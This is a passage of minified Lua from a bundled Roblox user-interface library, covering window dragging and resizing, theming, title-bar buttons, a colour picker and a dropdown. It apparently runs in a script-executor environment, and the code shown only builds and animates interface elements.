m.Frame=j('Frame',{Size=UDim2.new(1,0,0,42),BackgroundTransparency=1,Parent=l.Parent},{j('Frame',{Size=UDim2.new(1,-16,1,0),Position=UDim2.new(0,16,0,0),BackgroundTransparency=1},{j('UIListLayout',{Padding=UDim.new(0,5),FillDirection=Enum.FillDirection.Horizontal,SortOrder=Enum.SortOrder.LayoutOrder}),j('TextLabel',{RichText=true,Text=l.Title,FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.Regular,Enum.FontStyle.Normal),TextSize=12,TextXAlignment='Left',TextYAlignment='Center',Size=UDim2.fromScale(0,1),AutomaticSize=Enum.AutomaticSize.X,BackgroundTransparency=1,ThemeTag={TextColor3='Text'}}),j('TextLabel',{RichText=true,Text=l.SubTitle,TextTransparency=0.4,FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.Regular,Enum.FontStyle.Normal),TextSize=12,TextXAlignment='Left',TextYAlignment='Center',Size=UDim2.fromScale(0,1),AutomaticSize=Enum.AutomaticSize.X,BackgroundTransparency=1,ThemeTag={TextColor3='Text'}})}),j('Frame',{BackgroundTransparency=0.5,Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),ThemeTag={BackgroundColor3='TitleBarLine'}})})m.CloseButton=o(g.Close,UDim2.new(1,-4,0,4),m.Frame,function()n.Window:Dialog{Title='Close',Content='Are you sure you want to unload the interface?',Buttons={{Title='Yes',Callback=function()n:Destroy()end},{Title='No'}}}end)m.MaxButton=o(g.Max,UDim2.new(1,-40,0,4),m.Frame,function()l.Window.Maximize(not l.Window.Maximized)end)m.MinButton=o(g.Min,UDim2.new(1,-80,0,4),m.Frame,function()n.Window:Minimize()end)return m end end)()end,[17]=function()local b,c,d=a(17)local e return(function(...)local f,g,h,i=game:GetService'UserInputService',game:GetService'Players'.LocalPlayer:GetMouse(),game:GetService'Workspace'.CurrentCamera,c.Parent.Parent local j,k,l,m,n=d(i.Packages.Flipper),d(i.Creator),d(i.Acrylic),d(c.Parent.Assets),c.Parent local o,p,q,r,s,t,u=j.Spring.new,j.Instant.new,k.New,game:GetService'UserInputService',game:GetService'RunService',game.Players.LocalPlayer,game:GetService'CoreGui'local v,w,x=s.RenderStepped,q('ScreenGui',{Parent=s:IsStudio()and t.PlayerGui or u}),Instance.new'TextButton'x.Position=UDim2.new(0,0,0,0)x.Size=UDim2.new(0,100,0,50)x.Text=''x.BackgroundTransparency=1 x.Visible=true x.Modal=true x.Parent=w local y=function(y)x.Visible=y x.Modal=y end return function(z)local A,B,C,D,E,F=d(i),{Minimized=false,Maximized=false,Size=z.Size,CurrentPos=0,TabWidth=0,Position=UDim2.fromOffset(h.ViewportSize.X/2-z.Size.X.Offset/2,h.ViewportSize.Y/2-z.Size.Y.Offset/2)},false local G,H=false local I=false B.AcrylicPaint=l.AcrylicPaint()B.TabWidth=z.TabWidth local J,K=q('Frame',{Size=UDim2.fromOffset(4,0),BackgroundColor3=Color3.fromRGB(76,194,255),Position=UDim2.fromOffset(0,17),AnchorPoint=Vector2.new(0,0.5),ThemeTag={BackgroundColor3='Accent'}},{q('UICorner',{CornerRadius=UDim.new(0,2)})}),q('Frame',{Size=UDim2.fromOffset(20,20),BackgroundTransparency=1,Position=UDim2.new(1,-20,1,-20)})B.TabHolder=q('ScrollingFrame',{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,ScrollBarImageTransparency=1,ScrollBarThickness=0,BorderSizePixel=0,CanvasSize=UDim2.fromScale(0,0),ScrollingDirection=Enum.ScrollingDirection.Y},{q('UIListLayout',{Padding=UDim.new(0,4)})})local L=q('Frame',{Size=UDim2.new(0,B.TabWidth,1,-66),Position=UDim2.new(0,12,0,54),BackgroundTransparency=1,ClipsDescendants=true},{B.TabHolder,J})B.TabDisplay=q('TextLabel',{RichText=true,Text='Tab',TextTransparency=0,FontFace=Font.new('rbxassetid://12187365364',Enum.FontWeight.SemiBold,Enum.FontStyle.Normal),TextSize=28,TextXAlignment='Left',TextYAlignment='Center',Size=UDim2.new(1,-16,0,28),Position=UDim2.fromOffset(B.TabWidth+26,56),BackgroundTransparency=1,ThemeTag={TextColor3='Text'}})B.ContainerHolder=q('Frame',{Size=UDim2.fromScale(1,1),BackgroundTransparency=1})B.ContainerAnim=q('CanvasGroup',{Size=UDim2.fromScale(1,1),BackgroundTransparency=1})B.ContainerCanvas=q('Frame',{Size=UDim2.new(1,-B.TabWidth-32,1,-102),Position=UDim2.fromOffset(B.TabWidth+26,90),BackgroundTransparency=1},{B.ContainerAnim,B.ContainerHolder})B.Root=q('Frame',{BackgroundTransparency=1,Size=B.Size,Position=B.Position,Parent=z.Parent},{B.AcrylicPaint.Frame,B.TabDisplay,B.ContainerCanvas,L,K})B.TitleBar=d(c.Parent.TitleBar){Title=z.Title,SubTitle=z.SubTitle,Parent=B.Root,Window=B}if d(i).UseAcrylic then B.AcrylicPaint.AddParent(B.Root)end local M,N=j.GroupMotor.new{X=B.Size.X.Offset,Y=B.Size.Y.Offset},j.GroupMotor.new{X=B.Position.X.Offset,Y=B.Position.Y.Offset}B.SelectorPosMotor=j.SingleMotor.new(17)B.SelectorSizeMotor=j.SingleMotor.new(0)B.ContainerBackMotor=j.SingleMotor.new(0)B.ContainerPosMotor=j.SingleMotor.new(94)M:onStep(function(O)B.Root.Size=UDim2.new(0,O.X,0,O.Y)end)N:onStep(function(O)B.Root.Position=UDim2.new(0,O.X,0,O.Y)end)local O,P=0,0 B.SelectorPosMotor:onStep(function(Q)J.Position=UDim2.new(0,0,0,Q+17)local R=tick()local S=R-P if O~=nil then B.SelectorSizeMotor:setGoal(o((math.abs(Q-O)/(S*60))+16))O=Q end P=R end)B.SelectorSizeMotor:onStep(function(Q)J.Size=UDim2.new(0,4,0,Q)end)B.ContainerBackMotor:onStep(function(Q)B.ContainerAnim.GroupTransparency=Q end)B.ContainerPosMotor:onStep(function(Q)B.ContainerAnim.Position=UDim2.fromOffset(0,Q)end)local Q,R B.Maximize=function(S,T,U)B.Maximized=S B.TitleBar.MaxButton.Frame.Icon.Image=S and m.Restore or m.Max if S then Q=B.Size.X.Offset R=B.Size.Y.Offset end local V,W=S and h.ViewportSize.X or Q,S and h.ViewportSize.Y or R M:setGoal{X=j[U and'Instant'or'Spring'].new(V,{frequency=6}),Y=j[U and'Instant'or'Spring'].new(W,{frequency=6})}B.Size=UDim2.fromOffset(V,W)if not T then N:setGoal{X=o(S and 0 or B.Position.X.Offset,{frequency=6}),Y=o(S and 0 or B.Position.Y.Offset,{frequency=6})}end end k.AddSignal(B.TitleBar.Frame.InputBegan,function(S)if S.UserInputType==Enum.UserInputType.MouseButton1 or S.UserInputType==Enum.UserInputType.Touch then C=true E=S.Position F=B.Root.Position if B.Maximized then F=UDim2.fromOffset(g.X-(g.X*((Q-100)/B.Root.AbsoluteSize.X)),g.Y-(g.Y*(R/B.Root.AbsoluteSize.Y)))end S.Changed:Connect(function()if S.UserInputState==Enum.UserInputState.End then C=false end end)end end)k.AddSignal(B.TitleBar.Frame.InputChanged,function(S)if S.UserInputType==Enum.UserInputType.MouseMovement or S.UserInputType==Enum.UserInputType.Touch then D=S end end)k.AddSignal(K.InputBegan,function(S)if S.UserInputType==Enum.UserInputType.MouseButton1 or S.UserInputType==Enum.UserInputType.Touch then G=true H=S.Position end end)k.AddSignal(r.InputChanged,function(S)if S==D and C then local T=S.Position-E B.Position=UDim2.fromOffset(F.X.Offset+T.X,F.Y.Offset+T.Y)N:setGoal{X=p(B.Position.X.Offset),Y=p(B.Position.Y.Offset)}if B.Maximized then B.Maximize(false,true,true)end end if(S.UserInputType==Enum.UserInputType.MouseMovement or S.UserInputType==Enum.UserInputType.Touch)and G then local T,U=S.Position-H,B.Size local V=Vector3.new(U.X.Offset,U.Y.Offset,0)+Vector3.new(1,1,0)*T local W=Vector2.new(math.clamp(V.X,470,2048),math.clamp(V.Y,380,2048))M:setGoal{X=j.Instant.new(W.X),Y=j.Instant.new(W.Y)}end end)k.AddSignal(r.InputEnded,function(S)if G==true or S.UserInputType==Enum.UserInputType.Touch then G=false B.Size=UDim2.fromOffset(M:getValue().X,M:getValue().Y)end end)k.AddSignal(B.TabHolder.UIListLayout:GetPropertyChangedSignal'AbsoluteContentSize',function()B.TabHolder.CanvasSize=UDim2.new(0,0,0,B.TabHolder.UIListLayout.AbsoluteContentSize.Y)end)k.AddSignal(r.InputBegan,function(S)if type(A.MinimizeKeybind)=='table'and A.MinimizeKeybind.Type=='Keybind'and not r:GetFocusedTextBox()then if S.KeyCode.Name==A.MinimizeKeybind.Value then B:Minimize()end elseif S.KeyCode==A.MinimizeKey and not r:GetFocusedTextBox()then B:Minimize()end end)function B.Minimize(S)B.Minimized=not B.Minimized B.Root.Visible=not B.Minimized y(not B.Minimized)if not B.Minimized then task.spawn(function()local T,U=r.MouseIconEnabled,Drawing.new'Triangle'U.Thickness=1 U.Filled=true U.Visible=true local V=Drawing.new'Triangle'V.Thickness=1 V.Filled=false V.Color=Color3.new(0,0,0)V.Visible=true while not B.Minimized and B.Root and w.Parent do r.MouseIconEnabled=false local W=r:GetMouseLocation()U.Color=Color3.new(1,1,1)U.PointA=Vector2.new(W.X,W.Y)U.PointB=Vector2.new(W.X+16,W.Y+6)U.PointC=Vector2.new(W.X+6,W.Y+16)V.PointA=U.PointA V.PointB=U.PointB V.PointC=U.PointC v:Wait()end r.MouseIconEnabled=T U:Remove()V:Remove()end)end if not I then I=true local T=A.MinimizeKeybind and A.MinimizeKeybind.Value or A.MinimizeKey.Name A:Notify{Title='Interface',Content='Press '..T..' to toggle the interface.',Duration=6}end end function B.Destroy(S)if d(i).UseAcrylic then B.AcrylicPaint.Model:Destroy()end y(false)w:Destroy()B.Root:Destroy()end local S=d(n.Dialog):Init(B)function B.Dialog(T,U)local V=S:Create()V.Title.Text=U.Title local W=q('TextLabel',{FontFace=Font.new'rbxasset://fonts/families/GothamSSm.json',Text=U.Content,TextColor3=Color3.fromRGB(240,240,240),TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,Size=UDim2.new(1,-40,1,0),Position=UDim2.fromOffset(20,60),BackgroundTransparency=1,Parent=V.Root,ClipsDescendants=false,ThemeTag={TextColor3='Text'}})q('UISizeConstraint',{MinSize=Vector2.new(300,165),MaxSize=Vector2.new(620,math.huge),Parent=V.Root})V.Root.Size=UDim2.fromOffset(W.TextBounds.X+40,165)if W.TextBounds.X+40>B.Size.X.Offset-120 then V.Root.Size=UDim2.fromOffset(B.Size.X.Offset-120,165)W.TextWrapped=true V.Root.Size=UDim2.fromOffset(B.Size.X.Offset-120,W.TextBounds.Y+150)end for X,Y in next,U.Buttons do V:Button(Y.Title,Y.Callback)end V:Open()end local T=d(n.Tab):Init(B)function B.AddTab(U,V)return T:New(V.Title,V.Icon,B.TabHolder)end function B.SelectTab(U,V)T:SelectTab(1)end k.AddSignal(B.TabHolder:GetPropertyChangedSignal'CanvasPosition',function()O=T:GetCurrentTabPos()+16 P=0 B.SelectorPosMotor:setGoal(p(T:GetCurrentTabPos()))end)return B end end)()end,[18]=function()local b,c,d=a(18)local e return(function(...)local g=c.Parent local h,i,j=d(g.Themes),d(g.Packages.Flipper),{Registry={},Signals={},TransparencyMotors={},DefaultProperties={ScreenGui={ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling},Frame={BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),BorderSizePixel=0},ScrollingFrame={BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),ScrollBarImageColor3=Color3.new(0,0,0)},TextLabel={BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),Font=Enum.Font.SourceSans,Text='',TextColor3=Color3.new(0,0,0),BackgroundTransparency=1,TextSize=14},TextButton={BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),AutoButtonColor=false,Font=Enum.Font.SourceSans,Text='',TextColor3=Color3.new(0,0,0),TextSize=14},TextBox={BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),ClearTextOnFocus=false,Font=Enum.Font.SourceSans,Text='',TextColor3=Color3.new(0,0,0),TextSize=14},ImageLabel={BackgroundTransparency=1,BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),BorderSizePixel=0},ImageButton={BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),AutoButtonColor=false},CanvasGroup={BackgroundColor3=Color3.new(1,1,1),BorderColor3=Color3.new(0,0,0),BorderSizePixel=0}}}local k=function(k,l)if l.ThemeTag then j.AddThemeObject(k,l.ThemeTag)end end function j.AddSignal(l,m)table.insert(j.Signals,l:Connect(m))end function j.Disconnect()for l=#j.Signals,1,-1 do local m=table.remove(j.Signals,l)m:Disconnect()end end function j.GetThemeProperty(l)if h[d(g).Theme][l]then return h[d(g).Theme][l]end return h.Dark[l]end function j.UpdateTheme()for l,m in next,j.Registry do for n,o in next,m.Properties do l[n]=j.GetThemeProperty(o)end end for n,o in next,j.TransparencyMotors do o:setGoal(i.Instant.new(j.GetThemeProperty'ElementTransparency'))end end function j.AddThemeObject(l,m)local n=#j.Registry+1 local o={Object=l,Properties=m,Idx=n}j.Registry[l]=o j.UpdateTheme()return l end function j.OverrideTag(l,m)j.Registry[l].Properties=m j.UpdateTheme()end function j.New(l,m,n)local o=Instance.new(l)for p,q in next,j.DefaultProperties[l]or{}do o[p]=q end for r,s in next,m or{}do if r~='ThemeTag'then o[r]=s end end for t,u in next,n or{}do u.Parent=o end k(o,m)return o end function j.SpringMotor(l,m,n,o,r)o=o or false r=r or false local s=i.SingleMotor.new(l)s:onStep(function(t)m[n]=t end)if r then table.insert(j.TransparencyMotors,s)end local t=function(t,u)u=u or false if not o then if not u then if n=='BackgroundTransparency'and d(g).DialogOpen then return end end end s:setGoal(i.Spring.new(t,{frequency=8}))end return s,t end return j end)()end,[19]=function()local b,c,d=a(19)local e return(function(...)local g={}for h,i in next,c:GetChildren()do table.insert(g,d(i))end return g end)()end,[20]=function()local b,c,d=a(20)local e return(function(...)local g=c.Parent.Parent local h=d(g.Creator)local i,j,k=h.New,g.Components,{}k.__index=k k.__type='Button'function k.New(l,m)assert(m.Title,'Button - Missing Title')m.Callback=m.Callback or function()end local n=d(j.Element)(m.Title,m.Description,l.Container,true)local o=i('ImageLabel',{Image='rbxassetid://10709791437',Size=UDim2.fromOffset(16,16),AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-10,0.5,0),BackgroundTransparency=1,Parent=n.Frame,ThemeTag={ImageColor3='Text'}})h.AddSignal(n.Frame.MouseButton1Click,function()l.Library:SafeCallback(m.Callback)end)return n end return k end)()end,[21]=function()local b,c,d=a(21)local e return(function(...)local g,h,i,j=game:GetService'UserInputService',game:GetService'TouchInputService',game:GetService'RunService',game:GetService'Players'local k,l=i.RenderStepped,j.LocalPlayer local m,n=l:GetMouse(),c.Parent.Parent local o=d(n.Creator)local r,s,t=o.New,n.Components,{}t.__index=t t.__type='Colorpicker'function t.New(u,v,w)local x=u.Library assert(w.Title,'Colorpicker - Missing Title')assert(w.Default,'AddColorPicker: Missing default value.')local y={Value=w.Default,Transparency=w.Transparency or 0,Type='Colorpicker',Title=type(w.Title)=='string'and w.Title or'Colorpicker',Callback=w.Callback or function(y)end}function y.SetHSVFromRGB(z,A)local B,C,D=Color3.toHSV(A)y.Hue=B y.Sat=C y.Vib=D end y:SetHSVFromRGB(y.Value)local z=d(s.Element)(w.Title,w.Description,u.Container,true)y.SetTitle=z.SetTitle y.SetDesc=z.SetDesc local A=r('Frame',{Size=UDim2.fromScale(1,1),BackgroundColor3=y.Value,Parent=z.Frame},{r('UICorner',{CornerRadius=UDim.new(0,4)})})local aa,ab=r('ImageLabel',{Size=UDim2.fromOffset(26,26),Position=UDim2.new(1,-10,0.5,0),AnchorPoint=Vector2.new(1,0.5),Parent=z.Frame,Image='http://www.roblox.com/asset/?id=14204231522',ImageTransparency=0.45,ScaleType=Enum.ScaleType.Tile,TileSize=UDim2.fromOffset(40,40)},{r('UICorner',{CornerRadius=UDim.new(0,4)}),A}),function()local B=d(s.Dialog):Create()B.Title.Text=y.Title B.Root.Size=UDim2.fromOffset(430,330)local C,D,E,F,G,H=y.Hue,y.Sat,y.Vib,y.Transparency,function()local C=d(s.Textbox)()C.Frame.Parent=B.Root C.Frame.Size=UDim2.new(0,90,0,32)return C end,function(C,D)return r('TextLabel',{FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.Medium,Enum.FontStyle.Normal),Text=C,TextColor3=Color3.fromRGB(240,240,240),TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,Size=UDim2.new(1,0,0,32),Position=D,BackgroundTransparency=1,Parent=B.Root,ThemeTag={TextColor3='Text'}})end local I,J=function()local I=Color3.fromHSV(C,D,E)return{R=math.floor(I.r*255),G=math.floor(I.g*255),B=math.floor(I.b*255)}end,r('ImageLabel',{Size=UDim2.new(0,18,0,18),ScaleType=Enum.ScaleType.Fit,AnchorPoint=Vector2.new(0.5,0.5),BackgroundTransparency=1,Image='http://www.roblox.com/asset/?id=4805639000'})local K,L=r('ImageLabel',{Size=UDim2.fromOffset(180,160),Position=UDim2.fromOffset(20,55),Image='rbxassetid://4155801252',BackgroundColor3=y.Value,BackgroundTransparency=0,Parent=B.Root},{r('UICorner',{CornerRadius=UDim.new(0,4)}),J}),r('Frame',{BackgroundColor3=y.Value,Size=UDim2.fromScale(1,1),BackgroundTransparency=y.Transparency},{r('UICorner',{CornerRadius=UDim.new(0,4)})})local M,N=r('ImageLabel',{Image='http://www.roblox.com/asset/?id=14204231522',ImageTransparency=0.45,ScaleType=Enum.ScaleType.Tile,TileSize=UDim2.fromOffset(40,40),BackgroundTransparency=1,Position=UDim2.fromOffset(112,220),Size=UDim2.fromOffset(88,24),Parent=B.Root},{r('UICorner',{CornerRadius=UDim.new(0,4)}),r('UIStroke',{Thickness=2,Transparency=0.75}),L}),r('Frame',{BackgroundColor3=y.Value,Size=UDim2.fromScale(1,1),BackgroundTransparency=0},{r('UICorner',{CornerRadius=UDim.new(0,4)})})local O,P=r('ImageLabel',{Image='http://www.roblox.com/asset/?id=14204231522',ImageTransparency=0.45,ScaleType=Enum.ScaleType.Tile,TileSize=UDim2.fromOffset(40,40),BackgroundTransparency=1,Position=UDim2.fromOffset(20,220),Size=UDim2.fromOffset(88,24),Parent=B.Root},{r('UICorner',{CornerRadius=UDim.new(0,4)}),r('UIStroke',{Thickness=2,Transparency=0.75}),N}),{}for Q=0,1,0.1 do table.insert(P,ColorSequenceKeypoint.new(Q,Color3.fromHSV(Q,1,1)))end local Q,R=r('UIGradient',{Color=ColorSequence.new(P),Rotation=90}),r('Frame',{Size=UDim2.new(1,0,1,-10),Position=UDim2.fromOffset(0,5),BackgroundTransparency=1})local S,T,U=r('ImageLabel',{Size=UDim2.fromOffset(14,14),Image='http://www.roblox.com/asset/?id=12266946128',Parent=R,ThemeTag={ImageColor3='DialogInput'}}),r('Frame',{Size=UDim2.fromOffset(12,190),Position=UDim2.fromOffset(210,55),Parent=B.Root},{r('UICorner',{CornerRadius=UDim.new(1,0)}),Q,R}),G()U.Frame.Position=UDim2.fromOffset(w.Transparency and 260 or 240,55)H('Hex',UDim2.fromOffset(w.Transparency and 360 or 340,55))local V=G()V.Frame.Position=UDim2.fromOffset(w.Transparency and 260 or 240,95)H('Red',UDim2.fromOffset(w.Transparency and 360 or 340,95))local W=G()W.Frame.Position=UDim2.fromOffset(w.Transparency and 260 or 240,135)H('Green',UDim2.fromOffset(w.Transparency and 360 or 340,135))local X=G()X.Frame.Position=UDim2.fromOffset(w.Transparency and 260 or 240,175)H('Blue',UDim2.fromOffset(w.Transparency and 360 or 340,175))local Y if w.Transparency then Y=G()Y.Frame.Position=UDim2.fromOffset(260,215)H('Alpha',UDim2.fromOffset(360,215))end local Z,_,aa if w.Transparency then local ab=r('Frame',{Size=UDim2.new(1,0,1,-10),Position=UDim2.fromOffset(0,5),BackgroundTransparency=1})_=r('ImageLabel',{Size=UDim2.fromOffset(14,14),Image='http://www.roblox.com/asset/?id=12266946128',Parent=ab,ThemeTag={ImageColor3='DialogInput'}})aa=r('Frame',{Size=UDim2.fromScale(1,1)},{r('UIGradient',{Transparency=NumberSequence.new{NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)},Rotation=270}),r('UICorner',{CornerRadius=UDim.new(1,0)})})Z=r('Frame',{Size=UDim2.fromOffset(12,190),Position=UDim2.fromOffset(230,55),Parent=B.Root,BackgroundTransparency=1},{r('UICorner',{CornerRadius=UDim.new(1,0)}),r('ImageLabel',{Image='http://www.roblox.com/asset/?id=14204231522',ImageTransparency=0.45,ScaleType=Enum.ScaleType.Tile,TileSize=UDim2.fromOffset(40,40),BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Parent=B.Root},{r('UICorner',{CornerRadius=UDim.new(1,0)})}),aa,ab})end local ab=function()K.BackgroundColor3=Color3.fromHSV(C,1,1)S.Position=UDim2.new(0,-1,C,-6)J.Position=UDim2.new(D,0,1-E,0)N.BackgroundColor3=Color3.fromHSV(C,D,E)U.Input.Text='#'..Color3.fromHSV(C,D,E):ToHex()V.Input.Text=I().R W.Input.Text=I().G X.Input.Text=I().B if w.Transparency then aa.BackgroundColor3=Color3.fromHSV(C,D,E)N.BackgroundTransparency=F _.Position=UDim2.new(0,-1,1-F,-6)Y.Input.Text=d(n):Round((1-F)*100,0)..'%'end end o.AddSignal(U.Input.FocusLost,function(ac)if ac then local ad,ae=pcall(Color3.fromHex,U.Input.Text)if ad and typeof(ae)=='Color3'then C,D,E=Color3.toHSV(ae)end end ab()end)o.AddSignal(V.Input.FocusLost,function(ac)if ac then local ad=I()local ae,af=pcall(Color3.fromRGB,V.Input.Text,ad.G,ad.B)if ae and typeof(af)=='Color3'then if tonumber(V.Input.Text)<=255 then C,D,E=Color3.toHSV(af)end end end ab()end)o.AddSignal(W.Input.FocusLost,function(ac)if ac then local ad=I()local ae,af=pcall(Color3.fromRGB,ad.R,W.Input.Text,ad.B)if ae and typeof(af)=='Color3'then if tonumber(W.Input.Text)<=255 then C,D,E=Color3.toHSV(af)end end end ab()end)o.AddSignal(X.Input.FocusLost,function(ac)if ac then local ad=I()local ae,af=pcall(Color3.fromRGB,ad.R,ad.G,X.Input.Text)if ae and typeof(af)=='Color3'then if tonumber(X.Input.Text)<=255 then C,D,E=Color3.toHSV(af)end end end ab()end)if w.Transparency then o.AddSignal(Y.Input.FocusLost,function(ac)if ac then pcall(function()local ad=tonumber(Y.Input.Text)if ad>=0 and ad<=100 then F=1-ad*0.01 end end)end ab()end)end o.AddSignal(K.InputBegan,function(ac)if ac.UserInputType==Enum.UserInputType.MouseButton1 or ac.UserInputType==Enum.UserInputType.Touch then while g:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)do local ad=K.AbsolutePosition.X local ae=ad+K.AbsoluteSize.X local af,ag=math.clamp(m.X,ad,ae),K.AbsolutePosition.Y local ah=ag+K.AbsoluteSize.Y local ai=math.clamp(m.Y,ag,ah)D=(af-ad)/(ae-ad)E=1-((ai-ag)/(ah-ag))ab()k:Wait()end end end)o.AddSignal(T.InputBegan,function(ac)if ac.UserInputType==Enum.UserInputType.MouseButton1 or ac.UserInputType==Enum.UserInputType.Touch then while g:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)do local ad=T.AbsolutePosition.Y local ae=ad+T.AbsoluteSize.Y local af=math.clamp(m.Y,ad,ae)C=((af-ad)/(ae-ad))ab()k:Wait()end end end)if w.Transparency then o.AddSignal(Z.InputBegan,function(ac)if ac.UserInputType==Enum.UserInputType.MouseButton1 then while g:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)do local ad=Z.AbsolutePosition.Y local ae=ad+Z.AbsoluteSize.Y local af=math.clamp(m.Y,ad,ae)F=1-((af-ad)/(ae-ad))ab()k:Wait()end end end)end ab()B:Button('Done',function()y:SetValue({C,D,E},F)end)B:Button'Cancel'B:Open()end function y.Display(ac)y.Value=Color3.fromHSV(y.Hue,y.Sat,y.Vib)A.BackgroundColor3=y.Value A.BackgroundTransparency=y.Transparency t.Library:SafeCallback(y.Callback,y.Value)t.Library:SafeCallback(y.Changed,y.Value)end function y.SetValue(ac,ad,ae)local af=Color3.fromHSV(ad[1],ad[2],ad[3])y.Transparency=ae or 0 y:SetHSVFromRGB(af)y:Display()end function y.SetValueRGB(ac,ad,ae)y.Transparency=ae or 0 y:SetHSVFromRGB(ad)y:Display()end function y.OnChanged(ac,ad)y.Changed=ad ad(y.Value)end function y.Destroy(ac)z:Destroy()x.Options[v]=nil end o.AddSignal(z.Frame.MouseButton1Click,function()ab()end)y:Display()x.Options[v]=y return y end return t end)()end,[22]=function()local aa,ab,ac=a(22)local ad return(function(...)local ae,af,ag,ah,ai=game:GetService'TweenService',game:GetService'UserInputService',game:GetService'Players'.LocalPlayer:GetMouse(),game:GetService'Workspace'.CurrentCamera,ab.Parent.Parent local b,c=ac(ai.Creator),ac(ai.Packages.Flipper)local d,e,g=b.New,ai.Components,{}g.__index=g g.__type='Dropdown'function g.New(h,i,j)local k,l,m=h.Library,{Values=j.Values,Value=j.Default,Multi=j.Multi,Buttons={},Opened=false,Type='Dropdown',Callback=j.Callback or function()end},ac(e.Element)(j.Title,j.Description,h.Container,false)m.DescLabel.Size=UDim2.new(1,-170,0,14)l.SetTitle=m.SetTitle l.SetDesc=m.SetDesc local n,o=d('TextLabel',{FontFace=Font.new('rbxasset://fonts/families/GothamSSm.json',Enum.FontWeight.Regular,Enum.FontStyle.Normal),Text='Value',TextColor3=Color3.fromRGB(240,240,240),TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,Size=UDim2.new(1,-30,0,14),Position=UDim2.new(0,8,0.5,0),AnchorPoint=Vector2.new(0,0.5),BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,TextTruncate=Enum.TextTruncate.AtEnd,ThemeTag={TextColor3='Text'}}),d('ImageLabel',{Image='rbxassetid://10709790948',Size=UDim2.fromOffset(16,16),AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-8,0.5,0),BackgroundTransparency=1,ThemeTag={ImageColor3='SubText'}})local r,s=d('TextButton',{Size=UDim2.fromOffset(160,30),Position=UDim2.new(1,-10,0.5,0),AnchorPoint=Vector2.new(1,0.5),BackgroundTransparency=0.9,Parent=m.Frame,ThemeTag={BackgroundColor3='DropdownFrame'}},{d('UICorner',{CornerRadius=UDim.new(0,5)}),d('UIStroke',{Transparency=0.5,ApplyStrokeMode=Enum.ApplyStrokeMode.Border,ThemeTag={Color='InElementBorder'}}),o,n}),d('UIListLayout',{Padding=UDim.new(0,3)})local t=d('ScrollingFrame',{Size=UDim2.new(1,-5,1,-10),Position=UDim2.fromOffset(5,5),BackgroundTransparency=1,BottomImage='rbxassetid://6889812791',MidImage='rbxassetid://6889812721',TopImage='rbxassetid://6276641225',ScrollBarImageColor3=Color3.fromRGB(255,255,255),ScrollBarImageTransparency=0.95,ScrollBarThickness=4,BorderSizePixel=0,CanvasSize=UDim2.fromScale(0,0)},{s})local u=d('Frame',{Size=UDim2.fromScale(1,0.6),ThemeTag={BackgroundColor3='DropdownHolder'}},{t,d('UICorner',{CornerRadius=UDim.new(0,7)}),d('UIStroke',{ApplyStrokeMode=Enum.ApplyStrokeMode.Border,ThemeTag={Color='DropdownBorder'}}),d('ImageLabel',{BackgroundTransparency=1,Image='http://www.roblox.com/asset/?id=5554236805',ScaleType=Enum.ScaleType.Slice,SliceCenter=Rect.new(23,23,277,277),Size=UDim2.fromScale(1,1)+UDim2.fromOffset(30,30),Position=UDim2.fromOffset(-15,-15),ImageColor3=Color3.fromRGB(0,0,0),ImageTransparency=0.1})})local v=d('Frame',{BackgroundTransparency=1,Size=UDim2.fromOffset(170,300),Parent=h.Library.GUI,Visible=false},{u,d('UISizeConstraint',{MinSize=Vector2.new(170,0)})})table.insert(k.OpenFrames,v)local w,x=function()local w=0 if ah.ViewportSize.Y-r.AbsolutePosition.Y<v.AbsoluteSize.Y-5 then w=v.AbsoluteSize.Y-5-(ah.ViewportSize.Y-r.AbsolutePosition.Y)+40 end v.Position=UDim2.fromOffset(r.AbsolutePosition.X-1,r.AbsolutePosition.Y-5-w)end,0 local y,z=function()if#l.Values>10 then v.Size=UDim2.fromOffset(x,392)else v.Size=UDim2.fromOffset(x,s.AbsoluteContentSize.Y+10)end end,function()t.CanvasSize=UDim2.fromOffset(0,s.AbsoluteContentSize.Y)end w()y()b.AddSignal(r:GetPropertyChangedSignal'AbsolutePosition',w)b.AddSignal(r.MouseButton1Click,function()l:Open()end)b.AddSignal(af.InputBegan,function(A)if A.UserInputType==Enum.UserInputType.MouseButton1 or A.UserInputType==Enum.UserInputType.Touch then local B,C=u.AbsolutePosition,u.AbsoluteSize if ag.X<B.X or ag.X>B.X+C.X or ag.Y<(B.Y-20-1)or ag.Y>B.Y+C.Y then l:Close()end end end)local A=h.ScrollFrame function l.Open(B)l.Opened=true A.ScrollingEnabled=false v.Visible=true ae:Create(u,TweenInfo.new(0.2,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{Size=UDim2.fromScale(1,1)}):Play()end function l.Close(B)l.Opened=false A.ScrollingEnabled=true u.Size=UDim2.fromScale(1,0.6)v.Visible=false end function l.Display(B)local C,D=l.Values,''if j.Multi then for E,F in next,C do if l.Value[F]then D=D..F..', 'end end D=D:sub(1,#D-2)else D=l.Value or''end n.Text=(D==''and'--'or D)end function l.GetActiveValues(B)if j.Multi then local C={}for D,E in next,l.Value do 